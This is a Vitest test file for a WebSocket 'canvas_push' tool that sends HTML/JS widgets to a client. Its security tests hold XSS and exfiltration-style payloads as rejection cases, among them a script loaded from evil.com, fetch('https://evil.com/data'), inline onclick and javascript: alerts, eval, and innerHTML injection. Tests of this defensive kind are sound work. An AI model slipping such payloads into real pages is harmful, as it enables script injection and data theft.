import { describe, it, expect, beforeEach, vi } from "vitest";
import { WebSocket } from "ws";
import {
  registerCanvasClient,
  pushCanvas,
  getConnectedCanvasClients,
  hasCanvasClient,
  canvasPushTool,
} from "../canvas/index.ts";

// Mock WebSocket
class MockWebSocket {
  public readyState = 1; // WebSocket.OPEN
  public messages: string[] = [];
  private eventHandlers: Map<string, Function[]> = new Map();

  send(data: string) {
    this.messages.push(data);
  }

  on(event: string, handler: Function) {
    if (!this.eventHandlers.has(event)) {
      this.eventHandlers.set(event, []);
    }
    this.eventHandlers.get(event)?.push(handler);
  }

  emit(event: string, ...args: any[]) {
    const handlers = this.eventHandlers.get(event) || [];
    handlers.forEach((handler) => handler(...args));
  }

  close() {
    this.readyState = 3; // WebSocket.CLOSED
    this.emit("close");
  }
}

describe("Live Canvas", () => {
  let mockWs: MockWebSocket;
  const testSessionId = "test-canvas-session";

  beforeEach(() => {
    mockWs = new MockWebSocket();
    // Clear any existing clients
    const clients = getConnectedCanvasClients();
    // Note: In a real scenario, we'd need a way to clear clients, but for testing
    // we'll work with fresh session IDs
  });

  describe("registerCanvasClient", () => {
    it("should register a canvas client", () => {
      registerCanvasClient(testSessionId, mockWs as any);

      expect(hasCanvasClient(testSessionId)).toBe(true);
      expect(getConnectedCanvasClients()).toContain(testSessionId);
    });

    it("should send a welcome message on connect", () => {
      registerCanvasClient(testSessionId, mockWs as any);

      expect(mockWs.messages.length).toBeGreaterThan(0);
      const welcomeMsg = JSON.parse(mockWs.messages[0]!);
      expect(welcomeMsg.type).toBe("connected");
      expect(welcomeMsg.sessionId).toBe(testSessionId);
    });

    it("should handle client disconnect", () => {
      registerCanvasClient(testSessionId, mockWs as any);
      expect(hasCanvasClient(testSessionId)).toBe(true);

      // Simulate disconnect
      mockWs.close();

      expect(hasCanvasClient(testSessionId)).toBe(false);
    });

    it("should handle incoming messages from client", () => {
      registerCanvasClient(testSessionId, mockWs as any);

      // Simulate a ping message
      const pingMessage = JSON.stringify({ type: "ping" });
      mockWs.emit("message", Buffer.from(pingMessage));

      // Should respond with pong
      const messages = mockWs.messages
        .slice(1)
        .map((m) => JSON.parse(m)); // Skip welcome message
      const pongMessage = messages.find((m) => m.type === "pong");
      expect(pongMessage).toBeDefined();
    });
  });

  describe("pushCanvas", () => {
    beforeEach(() => {
      registerCanvasClient(testSessionId, mockWs as any);
      // Clear welcome message
      mockWs.messages = [];
    });

    it("should push HTML content to connected client", async () => {
      const html = "<div>Hello Canvas!</div>";

      const result = await pushCanvas(testSessionId, html);

      expect(result).toBe("Canvas widget sent successfully");
      expect(mockWs.messages.length).toBe(1);

      const message = JSON.parse(mockWs.messages[0]!);
      expect(message.type).toBe("canvas_push");
      expect(message.html).toBe(html);
      expect(message.js).toBe("");
    });

    it("should push HTML and JavaScript content", async () => {
      const html = "<button id='btn'>Click me</button>";
      const js = "document.getElementById('btn').textContent = 'Clicked';";

      const result = await pushCanvas(testSessionId, html, js);

      expect(result).toBe("Canvas widget sent successfully");

      const message = JSON.parse(mockWs.messages[0]!);
      expect(message.type).toBe("canvas_push");
      expect(message.html).toBe(html);
      expect(message.js).toBe(js);
    });

    it("should reject dangerous HTML patterns (external scripts)", async () => {
      const dangerousHtml = '<script src="https://evil.com/hack.js"></script>';

      await expect(pushCanvas(testSessionId, dangerousHtml)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should reject dangerous HTML patterns (inline events)", async () => {
      const dangerousHtml = '<button onclick="alert(\'xss\')">Click</button>';

      await expect(pushCanvas(testSessionId, dangerousHtml)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should reject dangerous HTML patterns (javascript: protocol)", async () => {
      const dangerousHtml = '<a href="javascript:alert(\'xss\')">Link</a>';

      await expect(pushCanvas(testSessionId, dangerousHtml)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should reject dangerous JavaScript patterns (eval)", async () => {
      const html = "<div>Safe content</div>";
      const dangerousJs = "eval('alert(1)')";

      await expect(pushCanvas(testSessionId, html, dangerousJs)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should reject dangerous JavaScript patterns (fetch)", async () => {
      const html = "<div>Safe content</div>";
      const dangerousJs = "fetch('https://evil.com/data')";

      await expect(pushCanvas(testSessionId, html, dangerousJs)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should reject dangerous JavaScript patterns (XMLHttpRequest)", async () => {
      const html = "<div>Safe content</div>";
      const dangerousJs = "new XMLHttpRequest()";

      await expect(pushCanvas(testSessionId, html, dangerousJs)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should throw error for non-existent session", async () => {
      const html = "<div>Test</div>";

      await expect(pushCanvas("non-existent-session", html)).rejects.toThrow(
        /No canvas client connected/
      );
    });

    it("should handle WebSocket not ready state", async () => {
      mockWs.readyState = 0; // WebSocket.CONNECTING

      const html = "<div>Test</div>";

      await expect(pushCanvas(testSessionId, html)).rejects.toThrow(
        /WebSocket not ready/
      );
    });
  });

  describe("canvasPushTool", () => {
    beforeEach(() => {
      registerCanvasClient(testSessionId, mockWs as any);
      mockWs.messages = [];
    });

    it("should have correct tool definition", () => {
      expect(canvasPushTool.name).toBe("canvas_push");
      expect(canvasPushTool.description).toContain("Push an interactive HTML/JS widget");
      expect(canvasPushTool.inputSchema.type).toBe("object");
      expect(canvasPushTool.inputSchema.required).toContain("session_id");
      expect(canvasPushTool.inputSchema.required).toContain("html");
    });

    it("should execute successfully with valid input", async () => {
      const input = {
        session_id: testSessionId,
        html: "<div>Test widget</div>",
        js: "console.log('test')",
      };

      const result = await canvasPushTool.execute(input);

      expect(result).toBe("Canvas widget sent successfully");
    });

    it("should throw error for invalid input (missing session_id)", async () => {
      const input = {
        html: "<div>Test</div>",
      };

      await expect(canvasPushTool.execute(input)).rejects.toThrow();
    });

    it("should throw error for invalid input (missing html)", async () => {
      const input = {
        session_id: testSessionId,
      };

      await expect(canvasPushTool.execute(input)).rejects.toThrow();
    });

    it("should work with optional js parameter", async () => {
      const input = {
        session_id: testSessionId,
        html: "<div>Test widget</div>",
      };

      const result = await canvasPushTool.execute(input);

      expect(result).toBe("Canvas widget sent successfully");
    });
  });

  describe("Canvas Client Management", () => {
    it("should track multiple canvas clients", () => {
      const session1 = "session-1";
      const session2 = "session-2";
      const ws1 = new MockWebSocket();
      const ws2 = new MockWebSocket();

      registerCanvasClient(session1, ws1 as any);
      registerCanvasClient(session2, ws2 as any);

      const clients = getConnectedCanvasClients();
      expect(clients).toContain(session1);
      expect(clients).toContain(session2);
      expect(hasCanvasClient(session1)).toBe(true);
      expect(hasCanvasClient(session2)).toBe(true);
    });

    it("should remove only the disconnected client", () => {
      const session1 = "session-a";
      const session2 = "session-b";
      const ws1 = new MockWebSocket();
      const ws2 = new MockWebSocket();

      registerCanvasClient(session1, ws1 as any);
      registerCanvasClient(session2, ws2 as any);

      // Disconnect only session1
      ws1.close();

      expect(hasCanvasClient(session1)).toBe(false);
      expect(hasCanvasClient(session2)).toBe(true);
    });
  });

  describe("Canvas Security", () => {
    beforeEach(() => {
      registerCanvasClient(testSessionId, mockWs as any);
      mockWs.messages = [];
    });

    it("should allow safe HTML with common tags", async () => {
      const safeHtml = `
        <div class="container">
          <h1>Title</h1>
          <p>Paragraph</p>
          <ul>
            <li>Item 1</li>
            <li>Item 2</li>
          </ul>
          <table>
            <tr><td>Cell</td></tr>
          </table>
        </div>
      `;

      const result = await pushCanvas(testSessionId, safeHtml);
      expect(result).toBe("Canvas widget sent successfully");
    });

    it("should allow safe JavaScript with DOM manipulation", async () => {
      const html = "<div id='target'>Original</div>";
      const safeJs = `
        const target = document.getElementById('target');
        target.textContent = 'Updated';
      `;

      const result = await pushCanvas(testSessionId, html, safeJs);
      expect(result).toBe("Canvas widget sent successfully");
    });

    it("should allow data: URLs in iframes", async () => {
      const html = '<iframe src="data:text/html,<h1>Test</h1>"></iframe>';

      const result = await pushCanvas(testSessionId, html);
      expect(result).toBe("Canvas widget sent successfully");
    });

    it("should allow about:blank iframes", async () => {
      const html = '<iframe src="about:blank"></iframe>';

      const result = await pushCanvas(testSessionId, html);
      expect(result).toBe("Canvas widget sent successfully");
    });

    it("should block external iframes", async () => {
      const html = '<iframe src="https://evil.com"></iframe>';

      await expect(pushCanvas(testSessionId, html)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should block object tags", async () => {
      const html = '<object data="https://evil.com/file.pdf"></object>';

      await expect(pushCanvas(testSessionId, html)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should block embed tags", async () => {
      const html = '<embed src="https://evil.com/file.swf">';

      await expect(pushCanvas(testSessionId, html)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should block external stylesheets", async () => {
      const html = '<link rel="stylesheet" href="https://evil.com/style.css">';

      await expect(pushCanvas(testSessionId, html)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should block document.write", async () => {
      const html = "<div>Test</div>";
      const js = "document.write('<script>alert(1)</script>')";

      await expect(pushCanvas(testSessionId, html, js)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should block innerHTML assignments", async () => {
      const html = "<div>Test</div>";
      const js = "document.body.innerHTML = '<script>alert(1)</script>'";

      await expect(pushCanvas(testSessionId, html, js)).rejects.toThrow(
        /Content validation failed/
      );
    });

    it("should block Function constructor", async () => {
      const html = "<div>Test</div>";
      const js = "new Function('alert(1)')()";

      await expect(pushCanvas(testSessionId, html, js)).rejects.toThrow(
        /Content validation failed/
      );
    });
  });

  describe("Canvas Use Cases", () => {
    beforeEach(() => {
      registerCanvasClient(testSessionId, mockWs as any);
      mockWs.messages = [];
    });

    it("should support interactive forms", async () => {
      const html = `
        <form id="myform">
          <label>Name: <input type="text" name="name"></label>
          <label>Email: <input type="email" name="email"></label>
          <button type="submit">Submit</button>
        </form>
      `;
      const js = `
        document.getElementById('myform').addEventListener('submit', (e) => {
          e.preventDefault();
          const data = new FormData(e.target);
          console.log('Form submitted:', Object.fromEntries(data));
        });
      `;

      const result = await pushCanvas(testSessionId, html, js);
      expect(result).toBe("Canvas widget sent successfully");
    });

    it("should support data tables", async () => {
      const html = `
        <table border="1">
          <thead>
            <tr><th>Name</th><th>Value</th></tr>
          </thead>
          <tbody>
            <tr><td>Item 1</td><td>100</td></tr>
            <tr><td>Item 2</td><td>200</td></tr>
          </tbody>
        </table>
      `;

      const result = await pushCanvas(testSessionId, html);
      expect(result).toBe("Canvas widget sent successfully");
    });

    it("should support SVG charts", async () => {
      const html = `
        <svg width="200" height="200">
          <rect x="10" y="10" width="50" height="50" fill="blue" />
          <circle cx="100" cy="100" r="40" fill="red" />
        </svg>
      `;

      const result = await pushCanvas(testSessionId, html);
      expect(result).toBe("Canvas widget sent successfully");
    });

    it("should support custom widgets with CSS", async () => {
      const html = `
        <style>
          .widget { padding: 20px; background: #f0f0f0; border-radius: 8px; }
          .title { font-size: 20px; font-weight: bold; }
        </style>
        <div class="widget">
          <div class="title">My Widget</div>
          <p>Content goes here</p>
        </div>
      `;

      const result = await pushCanvas(testSessionId, html);
      expect(result).toBe("Canvas widget sent successfully");
    });
  });
});
